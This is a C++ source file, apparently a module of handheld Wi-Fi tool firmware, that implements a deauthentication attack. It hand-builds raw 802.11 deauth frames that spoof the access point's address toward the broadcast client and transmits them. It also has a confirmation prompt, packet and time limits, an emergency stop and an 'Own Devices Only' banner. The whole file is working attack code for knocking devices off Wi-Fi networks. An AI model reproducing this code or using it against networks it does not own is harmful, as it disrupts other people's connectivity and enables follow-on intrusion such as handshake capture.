#include "deauth.h"
#include "../config.h"
#include "../core/display_mgr.h"
#include "../core/wifi_mgr.h"
#include "../utils.h"

ModuleInterface* createDeauth() { return new Deauth(); }

void Deauth::init() {
    memset(targetBssid, 0, 6);
    memset(targetClient, 0xFF, 6);  // broadcast
    packetCount = 1;
    attacking = false;
    confirmed = false;
    attackStart = 0;
    sentCount = 0;
    lastSent = 0;
}

void Deauth::enter() {
    attacking = false;
    confirmed = false;
    sentCount = 0;
    // Get connected AP BSSID as default target
    if (wifiMgr.isConnected()) {
        uint8_t* b = WiFi.BSSID();
        memcpy(targetBssid, b, 6);
    }
    displayMgr.setDirty();
}

void Deauth::exit() {
    if (attacking) stopAttack();
}

void Deauth::sendDeauthFrame() {
    // Build 802.11 deauth frame (fc 0xC0)
    uint8_t frame[26];

    // Frame control: Deauthentication (0xC000)
    frame[0] = 0xC0;
    frame[1] = 0x00;
    // Duration
    frame[2] = 0x00; frame[3] = 0x00;
    // DA (dest = client)
    memcpy(frame + 4, targetClient, 6);
    // SA (source = BSSID / AP)
    memcpy(frame + 10, targetBssid, 6);
    // BSSID
    memcpy(frame + 16, targetBssid, 6);
    // Sequence Control
    frame[22] = 0x00; frame[23] = 0x00;
    // Reason Code: 7 = Class 3 frame received from nonassociated STA
    frame[24] = 0x07; frame[25] = 0x00;

    wifiMgr.sendRawPacket(frame, 26);
}

void Deauth::startAttack() {
    if (attacking) return;
    attacking = true;
    attackStart = millis();
    sentCount = 0;
    lastSent = 0;
    wifiMgr.promiscuousAcquire(getId());
}

void Deauth::stopAttack() {
    attacking = false;
    confirmed = false;
    wifiMgr.promiscuousRelease(getId());
    displayMgr.setDirty();
}

void Deauth::update() {
    if (!attacking) return;

    uint32_t now = millis();

    // Hard time limit
    if (now - attackStart > SEC_ATTACK_MAX_DURATION) {
        stopAttack();
        return;
    }

    // Send frames (rate: every 100ms)
    if (sentCount < packetCount && now - lastSent > 100) {
        sendDeauthFrame();
        sentCount++;
        lastSent = now;
        displayMgr.setDirty();
    }

    if (sentCount >= packetCount) {
        stopAttack();
    }
}

void Deauth::handleButton(ButtonEvent ev) {
    if (attacking) {
        // Any key = emergency stop
        if (ev != BTN_NONE) stopAttack();
        return;
    }

    if (!confirmed) {
        if (ev == BTN_OK_SHORT) {
            confirmed = true;
            displayMgr.setDirty();
        }
    } else {
        switch (ev) {
            case BTN_OK_SHORT:
                startAttack();
                displayMgr.setDirty();
                break;
            case BTN_UP_SHORT:
                if (packetCount < SEC_DEAUTH_MAX_COUNT) packetCount++;
                displayMgr.setDirty();
                break;
            case BTN_DOWN_SHORT:
                if (packetCount > 1) packetCount--;
                displayMgr.setDirty();
                break;
            default: break;
        }
    }
}

void Deauth::draw(U8G2& u8g2) {
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 9, "Deauth Attack");

    // Warning banner
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 24, "Test Mode - Own Devices Only");

    if (attacking) {
        u8g2.setFont(FONT_DATA);
        char buf[40];
        snprintf(buf, sizeof(buf), "Sending %d/%d", sentCount, packetCount);
        u8g2.drawStr(2, 42, buf);

        uint32_t remaining = (SEC_ATTACK_MAX_DURATION - (millis() - attackStart)) / 1000;
        snprintf(buf, sizeof(buf), "Left:%lu s", remaining);
        u8g2.drawStr(2, 63, buf);
    } else if (!confirmed) {
        u8g2.setFont(FONT_DATA);
        u8g2.drawStr(2, 42, "Press OK to enter test mode");
    } else {
        u8g2.setFont(FONT_DATA);
        char macBuf[18]; macToStr(targetBssid, macBuf, sizeof(macBuf));
        char buf[40];
        snprintf(buf, sizeof(buf), "Tgt:%s", macBuf);
        u8g2.drawStr(2, 42, buf);
        snprintf(buf, sizeof(buf), "Cnt:%d OK:send UP/DN", packetCount);
        u8g2.drawStr(2, 63, buf);
    }
}
